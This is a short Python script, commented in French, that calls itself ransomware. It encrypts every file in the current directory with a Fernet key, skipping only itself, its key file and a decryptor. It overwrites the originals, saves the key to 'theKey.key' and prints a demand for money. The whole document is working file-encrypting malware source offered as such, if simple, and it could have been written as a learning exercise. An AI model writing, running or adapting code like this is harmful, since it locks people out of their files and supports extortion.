import os
from cryptography.fernet import Fernet



# Rechercher les fichiers a crypter
fichiers = []

for file in os.listdir():
	if file == "doNotOpen.py" or file == "theKey.key" or file =="decrypt.py":
		continue
 #Ca serait bête de crypter le ransomware ou le fichier contenant la clé ou le decrypteur  :)
	if os.path.isfile(file):     #On veut crypter  uniquement les fichiers
		fichiers.append(file)



key = Fernet.generate_key() #Vraiment besoin de commentaire ? 



with open("theKey.key","wb") as theKey:   #Crée un fichier et save la clef dedans
	theKey.write(key)



for file in fichiers:             
	with open(file,"rb") as theFile:   		#rb : read
		data = theFile.read()   		# Save le contenu du fichier dans "data"
	data_encrypted = Fernet(key).encrypt(data)  	#Permet de crypter data avec la clé
	with open(file,"wb") as theFile:		#wb : write
		theFile.write(data_encrypted) 
	# la derniere ligne remplace le contenue du fichier  par data_encrypted

	
	
print("Tous vos fichiers ont été crypté, merci de m'envoyer beaucoup d'argent")
print("Verifiez avec un 'cat nomfichier' :)")
